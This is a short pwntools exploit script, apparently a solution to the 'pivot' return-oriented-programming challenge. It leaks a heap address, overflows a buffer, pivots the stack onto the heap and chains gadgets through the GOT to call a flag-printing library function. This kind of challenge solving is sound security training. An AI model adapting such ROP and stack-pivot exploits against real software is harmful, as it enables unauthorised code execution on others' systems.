#/usr/bin/env python
from pwn import *

context.binary = './pivot'
#context.log_level ='debug'

io = process('./pivot')
elf =ELF('./pivot')
libc_pivot32 = ELF('./libpivot.so')

def build_frist_rop_chain(heapaddr):
	payload = 'A'*(0x28)
	payload += p64(0x400b00)
	payload += p64(heapaddr)
	payload += p64(0x400b02)
	io.sendline(payload)

def build_second_rop_chain():
	io.recvuntil('\n> ')
	payload = p64(elf.plt['foothold_function'])   #binging to GOT
	payload += p64(0x400b00)        #pop rax ret;
	payload += p64(elf.got['foothold_function'])
	payload += p64(0x400b05)        #mov rax,[rax] ret;
	payload += p64(0x400900)       #pop rbp ret;
	payload += p64(0xABE-0x970)       
	payload += p64(0x400B09)        #add rax,rbp ret
	payload += p64(0x04008f5)       #jmp eax;
	payload += 'AAAA'*4
	io.sendline(payload)

#leak heap address
io.recvuntil('pivot: ')
heapaddr = io.recvuntil('\n',drop =True)
heapaddr = int(heapaddr,16)
log.info('addr:'+hex(heapaddr))

build_second_rop_chain()
build_frist_rop_chain(heapaddr)
flag = io.recvline()
log.info('flag:'+flag)

io.interactive()
